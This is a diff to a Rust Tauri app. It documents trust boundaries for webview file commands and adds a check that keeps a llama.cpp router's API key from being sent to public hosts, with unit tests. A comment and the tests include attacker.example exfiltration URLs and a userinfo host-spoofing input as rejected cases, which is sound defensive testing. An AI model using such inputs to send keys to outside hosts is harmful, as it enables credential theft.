@@ -2491,6 +2491,11 @@ fn pi_reveal_session(path: String) -> Result<(), String> {
 /// arbitrary-file-open primitive exposed to the webview.
 #[tauri::command]
 fn pi_reveal_dir(path: String) -> Result<(), String> {
+	// Webview-driven and deliberately not contained to a root: the whole point
+	// is to reveal a directory the USER picked (a workspace can live anywhere),
+	// and the capability granted to a compromised renderer is "open Explorer
+	// on a folder" — no file contents are read. Same trust boundary as
+	// pi_project_files below; the CSP is the primary control.
 	let p = PathBuf::from(&path);
 	if !p.is_dir() {
 		return Err(format!("not a directory: {path}"));
@@ -2664,6 +2669,12 @@ const MAX_PROJECT_FILES: usize = 8000;
 
 #[tauri::command]
 async fn pi_project_files(project: String) -> Result<Vec<String>, String> {
+	// Webview-driven and deliberately not contained to a root: it lists the
+	// names of a directory the USER picked as a workspace (the file tree
+	// panel). The worst a compromised renderer gains is an existence oracle
+	// over an arbitrary directory — no file contents are read, and the same
+	// information is one folder-picker away for the user anyway. Trust
+	// boundary documented rather than fenced: there is no root to fence to.
 	run_blocking(move || {
 		let root = PathBuf::from(&project);
 		if !root.is_dir() {
@@ -3481,6 +3492,54 @@ fn cleanup_curl_file(path: &Option<PathBuf>) {
 	}
 }
 
+/// Extract the host from a scheme-checked http(s) router URL: userinfo and
+/// port stripped, IPv6 brackets removed, lowercased.
+fn router_host(url: &str) -> Option<String> {
+	let authority = url.split_once("://")?.1;
+	let authority = authority.split(['/', '?', '#']).next().unwrap_or("");
+	// rsplit so a userinfo '@' can't spoof the host (user@evil host@good).
+	let host_port = authority.rsplit('@').next().unwrap_or(authority);
+	let host = if let Some(rest) = host_port.strip_prefix('[') {
+		// [::1] or [::1]:8080
+		rest.split(']').next().unwrap_or(rest)
+	} else {
+		host_port.split(':').next().unwrap_or(host_port)
+	};
+	(!host.is_empty()).then(|| host.to_ascii_lowercase())
+}
+
+/// True when the host is publicly routable — i.e. NOT where a llama.cpp router
+/// lives. Loopback, RFC1918 private space, link-local and mDNS .local names are
+/// the local/LAN shapes that pass.
+fn is_public_host(host: &str) -> bool {
+	if host == "localhost" || host.ends_with(".localhost") || host.ends_with(".local") {
+		return false;
+	}
+	// Unbracketed IPv6 loopback spelling.
+	if host == "::1" {
+		return false;
+	}
+	let Ok(ip) = host.parse::<std::net::IpAddr>() else {
+		// Not an IP literal: any other DNS name is treated as public.
+		return true;
+	};
+	match ip {
+		std::net::IpAddr::V4(v4) => {
+			let o = v4.octets();
+			!(o[0] == 127
+				|| o[0] == 10
+				|| (o[0] == 172 && (16..=31).contains(&o[1]))
+				|| (o[0] == 192 && o[1] == 168)
+				|| (o[0] == 169 && o[1] == 254))
+		}
+		std::net::IpAddr::V6(v6) => {
+			let s = v6.segments();
+			// fc00::/7 unique-local and fe80::/10 link-local are LAN shapes.
+			!((s[0] & 0xfe00) == 0xfc00 || (s[0] & 0xffc0) == 0xfe80)
+		}
+	}
+}
+
 fn llama_curl_args(
 	url: &str,
 	api_key: &Option<String>,
@@ -3492,6 +3551,23 @@ fn llama_curl_args(
 	let trimmed = url.trim();
 	if !(trimmed.starts_with("http://") || trimmed.starts_with("https://")) {
 		return Err("llama.cpp router URL must start with http:// or https://".into());
+	}
+	// …and never a publicly routable host. The Bearer key lives in the
+	// Rust-side store — the webview only ever sees a has-key boolean — so
+	// these three commands are the ONLY path it can leave by: a compromised
+	// renderer could otherwise call pi_llama_models("https://attacker.example")
+	// and have the Authorization header handed to whatever host it names.
+	// llama.cpp routers are local or on the user's LAN (the settings field's
+	// placeholder is 127.0.0.1:8080), so require exactly that shape. A genuine
+	// public-router setup can still be reached by pointing a private address
+	// at it (SSH tunnel / hosts entry) — the same trade the SSH-tunnel default
+	// already implies.
+	let host =
+		router_host(trimmed).ok_or_else(|| "llama.cpp router URL has no host".to_string())?;
+	if is_public_host(&host) {
+		return Err(format!(
+			"llama.cpp router URL must point at a local or private-network address, not {host}"
+		));
 	}
 	let mut args = Vec::new();
 	let mut header_file = None;
@@ -3944,6 +4020,102 @@ mod tests {
 		assert!(fork_session_at(&path, Some("e9")).is_err());
 		let _ = std::fs::remove_file(&res.session_file);
 		let _ = std::fs::remove_file(&path);
+	}
+
+	#[test]
+	fn router_host_strips_userinfo_port_and_brackets() {
+		assert_eq!(
+			router_host("http://127.0.0.1:8080").as_deref(),
+			Some("127.0.0.1")
+		);
+		assert_eq!(
+			router_host("https://Box.Lan/v1/models").as_deref(),
+			Some("box.lan")
+		);
+		assert_eq!(
+			router_host("http://user:pw@10.0.0.5:9/x").as_deref(),
+			Some("10.0.0.5")
+		);
+		assert_eq!(router_host("http://[::1]:8080").as_deref(), Some("::1"));
+		// The last '@' wins, so a userinfo segment can't spoof the host.
+		assert_eq!(
+			router_host("http://a@b@127.0.0.1").as_deref(),
+			Some("127.0.0.1")
+		);
+		assert!(router_host("not-a-url").is_none());
+	}
+
+	#[test]
+	fn is_public_host_classifies_local_lan_and_public() {
+		// Allowed: loopback, private space, link-local, mDNS.
+		for host in [
+			"localhost",
+			"127.0.0.1",
+			"127.5.5.5",
+			"::1",
+			"10.1.2.3",
+			"172.16.0.1",
+			"172.31.255.255",
+			"192.168.1.10",
+			"169.254.7.7",
+			"fc00::1",
+			"fe80::1",
+			"mybox.local",
+		] {
+			assert!(!is_public_host(host), "{host} should be allowed");
+		}
+		// Rejected: public IPs and ordinary DNS names.
+		for host in [
+			"8.8.8.8",
+			"1.1.1.1",
+			"172.32.0.1",
+			"192.169.1.1",
+			"11.0.0.1",
+			"2606:4700::1111",
+			"attacker.example",
+			"attacker.example.com",
+		] {
+			assert!(is_public_host(host), "{host} should be rejected");
+		}
+	}
+
+	#[test]
+	fn llama_curl_args_refuse_to_send_the_key_to_a_public_host() {
+		let key = Some("secret-llama-key".to_string());
+		// Local and LAN routers keep working (with the key).
+		for url in [
+			"http://127.0.0.1:8080",
+			"http://192.168.1.50:8080",
+			"http://mybox.local:8080",
+			"http://[::1]:8080",
+		] {
+			assert!(
+				llama_curl_args(url, &key, "/v1/models").is_ok(),
+				"{url} should work"
+			);
+		}
+		// A public host is refused outright — the key never reaches argv.
+		for url in [
+			"https://attacker.example/v1/models",
+			"http://8.8.8.8:8080",
+			// userinfo must not launder the check.
+			"http://127.0.0.1@attacker.example",
+		] {
+			let err = llama_curl_args(url, &key, "/v1/models")
+				.err()
+				.unwrap_or_else(|| panic!("{url} must be refused"));
+			assert!(
+				err.contains("local or private-network"),
+				"unexpected error: {err}"
+			);
+		}
+		// The host rule is unconditional, not a key-only gate: the feature is
+		// local/LAN routers, so a public address fails whether or not a key is
+		// stored (the error stays the same).
+		let err = llama_curl_args("https://attacker.example", &None, "/v1/models")
+			.err()
+			.expect("a public host must be refused even without a key");
+		assert!(err.contains("local or private-network"));
 	}
 
 	#[test]
